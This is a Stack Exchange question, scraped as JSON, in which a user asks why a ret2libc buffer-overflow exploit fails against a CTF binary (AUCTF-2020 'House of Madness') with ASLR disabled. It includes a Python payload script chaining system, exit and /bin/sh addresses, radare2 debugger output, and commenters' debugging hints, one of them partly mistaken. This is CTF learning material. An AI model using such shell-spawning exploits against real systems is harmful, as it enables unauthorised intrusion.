{
    "title": "exploiting a binary using ret2libc",
    "link": "https://reverseengineering.stackexchange.com/questions/24644/exploiting-a-binary-using-ret2libc",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I ran into this binary at a CTF :\n  <a href=\"https://github.com/auehc/AUCTF-2020/tree/master/Pwn/House%20of%20Madness\" rel=\"nofollow noreferrer\">\n   https://github.com/auehc/AUCTF-2020/tree/master/Pwn/House%20of%20Madness\n  </a>\n </p>\n <p>\n  I first tried to exploit it and get a shell using ret2libc technique, however I didn't succeed.\nI know it is not the intended way to solve the challenge, but after the CTF, I am now focusing\non achieving ret2libc on this binary. And I am now stuck and need help :)\n </p>\n <p>\n  The source is in\n  <code>\n   challenge.c\n  </code>\n  , and the compiled version is\n  <code>\n   challenge\n  </code>\n  .\n </p>\n <p>\n  ASLR is disabled for the challenge, and on my computer too :\n </p>\n <pre><code>$ > cat /proc/sys/kernel/randomize_va_space\n0\n</code></pre>\n <p>\n  It is possible to trigger a buffer overflow using this input :\n </p>\n <pre><code>\"2\n4\n3\nStephen\n\"\n</code></pre>\n <p>\n  plus some padding.\n </p>\n <p>\n  I wrote an exploit to try to pop a shell (without success) :\n </p>\n <pre><code>#!/usr/bin/env python2\n\nimport struct\n\nvalid_input = \"2\n4\n3\nStephen\n\"\npad = \"aaaaaaaa2Aa3Aa4Aa5Aa6Aa7aaaa\"\nbinsh = struct.pack(\"I\", 0xf7f4caaa)\nsystem = struct.pack(\"I\", 0xf7e0c9e0)\nexit = struct.pack(\"<I\", 0xf7dffa60)\n\nexploit = valid_input \\\n        + pad \\\n        + system \\\n        + exit \\\n        + binsh\nprint exploit\n</code></pre>\n <p>\n  Now, I will tell you why I don't understand why it's not working.\n </p>\n <p>\n  When i break on the\n  <code>\n   ret\n  </code>\n  in the function where I triggered the buffer overflow, the stack looks like this:\n </p>\n <pre><code>[0x56556684]> pxw 16 @esp\n0xffffd23c  0xf7e0c9e0 0xf7dffa60 0xf7f4caaa 0xffffd200  ....`...........\n</code></pre>\n <p>\n  so, you can see that first there is\n  <code>\n   0xf7e0c9e0\n  </code>\n  , then\n  <code>\n   0xf7dffa60\n  </code>\n  , then\n  <code>\n   0xf7f4caaa\n  </code>\n  .\n </p>\n <p>\n  <code>\n   0xf7e0c9e0\n  </code>\n  is the address of system in the libc :\n </p>\n <pre><code>[0x56556684]> dmi libc system\n257   0x0012a2c0 0xf7ef82c0 GLOBAL FUNC   102       svcerr_systemerr\n658   0x0003e9e0 0xf7e0c9e0 GLOBAL FUNC   55        __libc_system\n1525  0x0003e9e0 0xf7e0c9e0 WEAK   FUNC   55        system\n</code></pre>\n <p>\n  <code>\n   0xf7dffa60\n  </code>\n  is the address of exit, altough it shouldn't be needed, if I popped the shell.\n </p>\n <p>\n  <code>\n   0xf7f4caaa\n  </code>\n  is the address of the string\n  <code>\n   /bin/sh\\x00\n  </code>\n  in the libc :\n </p>\n <pre><code>[0x56556684]> px10@0xf7f4caaa\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0xf7f4caaa  2f62 696e 2f73 6800 6578                 /bin/sh.ex\n</code></pre>\n <p>\n  I am stuck there, and can't figure out what is happening.. If anyone can point me in the right direction, I would be very happy :)\n </p>\n</div>\n</body></html>",
    "votes": "0",
    "answers": 0,
    "views": "342",
    "tags": [
        "radare2",
        "exploit",
        "buffer-overflow",
        "stack",
        "libc"
    ],
    "user": "aguilbau",
    "time": "Apr 7, 2020 at 12:51",
    "comments": [
        {
            "user": "stylo",
            "text": "<html><body><span class=\"comment-copy\">\n Why do you need\n <code>\n  exit\n </code>\n address if you're not using it? when the\n <code>\n  ret\n </code>\n instruction is executed, the\n <code>\n  system\n </code>\n address is been popped out of the stack and the next 4 bytes are considered as the first argument of the function which, in this case, is\n <code>\n  exit\n </code>\n address. try replacing it with the\n <code>\n  /bin/sh\n </code>\n address, it should work.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "multithr3at3d",
            "text": "<html><body><span class=\"comment-copy\">\n @stylo Actually, the next 4 bytes are for the\n <i>\n  next\n </i>\n return address after\n <i>\n  system\n </i>\n , so\n <code>\n  exit\n </code>\n will be called after\n <code>\n  system\n </code>\n . What is happening when you try your payload?\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "multithr3at3d",
            "text": "<html><body><span class=\"comment-copy\">\n Also see\n <a href=\"https://security.stackexchange.com/q/155844\">\n  security.stackexchange.com/q/155844\n </a>\n , could be your problem if addresses are correct.\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": []
}